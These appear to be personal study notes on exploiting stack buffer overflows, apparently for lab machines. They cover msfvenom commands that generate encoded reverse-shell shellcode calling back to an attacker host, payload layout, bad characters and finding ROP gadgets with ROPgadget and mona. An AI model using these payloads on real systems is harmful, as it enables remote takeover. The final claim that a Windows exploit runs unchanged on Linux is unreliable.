# Buffer Overflow cheatsheet

## Generating Shellcode

```text
For Windows vulnerable machine
1. msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.1.77 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode
2. msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -e x86/unicode_mixed -b '\x00' BufferRegister=EAX -f python

For Linux vulnerable machine
1. msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.0.2.15 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode
```

## Payload Format

* **payload = junk + shell\_addr + \(nops + shellcode\)**
  * `junk` : is offset before the EIP overwritten.
  * `shell_addr` : is the address which we overwrite on the EIP register.
  * `(nops + shellcode)` : actual shell code address, we need to include nops for smooth execution of shellcode. nops are part of shellcode

## Computing shell\_addr 

1\) Hardcoding shellcode address

* Requirements
  * We need ASLR disabled. address randomization for stack memory
  * We need no null byte in hardcoded address of \(nops + shellcode\).
  * We need the stack executable.

2\) If shellcode address contain null byte.

* We need to use ROP gadgets to solve it.
* Requirements
  * We need ASLR disabled. address randomization on stack
  * We need the stack executable.
  * ROP objects need to be present which do not have null byte in its address.

3\) Even if the shellcode is not running

* It could be due to bad characters. There is a method to find bad characters.

## ROP Gadgets

* Different types of ROP gadgets. Depending on the ROP gadget we decide the payload format.
  * JMP ESP
  * POP RET
  * POP POP RET
* Not when we use ROP gadget, we inject our shellcode inside the "junk" text itself. From experience we  know that "**there is call made back to the stack"** after execution of ROP gadget which points to start of the "junk" address.
* The format **payload = buf + junk\_remaining + ROP\_addr** is for **POP RET**
  * where `buf` is our reverse tcp shellcode
  * where `junk_remaining` = junk - len\(buf\)
  * where `ROP_addr` is the address of the ROP gadget.
* The format **payload = junk + ROP\_addr + shellcode** is for **JMP ESP**

### Finding ROP in linux 1

* Used to find ROP gadgets in a .exe file.
* Download the [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) script.
* Using ROPgadget find the ROP gadgets on the vulnerable .exe file.

### Finding ROP in linux 2

* d

### Finding ROP gadgets in immunity debugger

* We could used this approach to find ROP gadgets in modules only. We cannot use it on .exe files.
* modules means all .dll files that the current program uses. 
* `!mona modules`
* Then we need to decide which modules to use. We use that modules that have most of the necessary protection mechanisms disabled. Like "ASLR", "DEP", "NX" ,etc.

![list of modules](../.gitbook/assets/image%20%289%29.png)

* We selected the brainpan.exe executable as all of the security protections are disabled.
* Our task now is to statically find ROP gadgets. We now can use "[Finding ROP in linux 1](./#finding-rop-in-linux-1)" approach for this mentioned above.

### Could the same exploit on windows x86 be used in linux x86 without modifying a single information?

* Yes but we need some Requirements for this:
  * Run `!mona modules` We need essential memory protection mechanisms disabled on the vulnerable `.exe` file
  * There should be ROP gadgets in the `.exe` file.
  * We need to run the same `.exe` file on the x86 linux machine.
* The only issue with such kind of exploit are the "**hardcoded addresses**".
* If we use ROP gadget method "JMP ESP" for buffer overflow, we have only one hardcoded address, that is of the address of the ROP gadget.
* If we met all the requirements mentioned above. Then the ROP gadget address will not change irrespective of the underlying OS, as it is present inside the `.exe` file itself.
